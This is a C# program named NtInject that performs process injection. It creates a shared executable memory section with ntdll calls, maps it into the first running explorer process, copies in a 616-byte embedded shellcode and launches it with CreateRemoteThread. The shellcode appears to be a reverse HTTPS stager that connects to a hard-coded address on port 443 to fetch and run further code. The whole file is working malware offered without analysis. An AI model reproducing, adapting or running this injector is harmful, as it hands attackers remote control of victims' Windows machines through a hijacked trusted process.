using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace NtInject
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
    ref IntPtr SectionHandle,
    UInt32 DesiredAccess,
    IntPtr ObjectAttributes,
    ref UInt32 MaximumSize,
    UInt32 SectionPageProtection,
    UInt32 AllocationAttributes,
    IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
    IntPtr SectionHandle,
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    UIntPtr ZeroBits,
    UIntPtr CommitSize,
    out ulong SectionOffset,
    out uint ViewSize,
    uint InheritDisposition,
    uint AllocationType,
    uint Win32Protect);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);private static uint SECTION_MAP_WRITE = 0x0002;private static uint SECTION_MAP_READ = 0x0004;private static uint SECTION_MAP_EXECUTE = 0x0008;
        private static uint SEC_COMMIT = 0x08000000;
        private static uint PAGE_EXECUTE_READWRITE = 0x40;
        private static uint ViewShare = 1;


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
   IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
   IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        //returns file handle to the first occurrence of a process
        static IntPtr getProcess(String processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            return processes[0].Handle;
        }
        static void Main(string[] args)
        {
            IntPtr sectionHandle = IntPtr.Zero;
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr remoteBaseAddress = IntPtr.Zero;
            uint newSection = 0;
            ulong sectionOffset = 0;
            uint vs = 0;
            uint maximumSize = 2048;
            byte[] buf = new byte[616] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x10,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x32,0x32,
0x33,0x2e,0x31,0x32,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,
0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,
0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x3c,0x00,0x00,0x00,0x2f,0x6d,0x78,
0x58,0x43,0x62,0x53,0x55,0x5f,0x56,0x4e,0x53,0x49,0x36,0x34,0x6e,0x70,0x36,
0x57,0x5f,0x2d,0x38,0x67,0x62,0x59,0x38,0x62,0x42,0x6f,0x68,0x6a,0x4e,0x67,
0x63,0x47,0x6a,0x6e,0x78,0x7a,0x65,0x34,0x4a,0x33,0x76,0x34,0x2d,0x31,0x4b,
0x4a,0x4d,0x64,0x48,0x4e,0x67,0x74,0x5f,0x78,0x55,0x31,0x00,0x48,0x89,0xc1,
0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,
0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,
0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,
0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,
0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,
0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,
0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,
0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,
0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,
0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,
0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,
0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,
0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,
0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,
0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
0xd5 };


            IntPtr pHandle = getProcess("explorer");
            UInt32 desiredAccess = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE; //I assume this is how you combine the three section_map attributes
            newSection = NtCreateSection(ref sectionHandle, desiredAccess, IntPtr.Zero, ref maximumSize, PAGE_EXECUTE_READWRITE,SEC_COMMIT,IntPtr.Zero);
            //map view of seciton in current process. handle to view of new section is in baseAddress
            newSection = NtMapViewOfSection(sectionHandle, currentProcess, ref baseAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare,0,PAGE_EXECUTE_READWRITE);
            //map the same view in a remote process
            newSection = NtMapViewOfSection(sectionHandle, pHandle, ref remoteBaseAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, PAGE_EXECUTE_READWRITE);

            //copy shellcode into my current process' section
            Marshal.Copy(buf, 0, baseAddress, buf.Length);

            //Unmap view in the current section
            newSection = NtUnmapViewOfSection(sectionHandle, baseAddress);

            //create thread in remote process
            IntPtr newThreadHandle = IntPtr.Zero;
            newThreadHandle = CreateRemoteThread(pHandle, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine(newThreadHandle);

            //close handle
            NtClose(sectionHandle);


        }

    }
}
